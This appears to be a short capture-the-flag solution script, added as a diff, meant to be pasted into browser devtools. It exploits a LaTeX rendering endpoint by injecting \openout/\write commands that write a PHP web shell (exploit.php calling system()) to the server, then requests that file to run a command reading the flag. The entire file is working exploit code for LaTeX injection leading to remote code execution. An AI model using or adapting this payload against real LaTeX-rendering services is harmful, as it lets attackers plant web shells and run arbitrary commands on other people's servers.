@@ -1,0 +1,13 @@
+// go to index.php and run this in the devtools
+run = async cmd => {
+  let r1 = await await fetch("/images/renderLaTeX.php", {
+    "body": "1+1\n\\newwrite\\tempfile\n\\immediate\\openout\\tempfile=exploit.php\n\\immediate\\write\\tempfile{<?php echo system('" + cmd + "'); ?>}\n\\immediate\\closeout\\tempfile\n",
+    "method": "POST",
+});
+  let text = await r1.text()
+  console.log(text)
+  let lnk = (text).match(/\/images\/.+\//)[0] + 'exploit.php'
+  let r2 = await fetch(lnk)
+  return r2.text()
+}
+await run('/app/readflag')
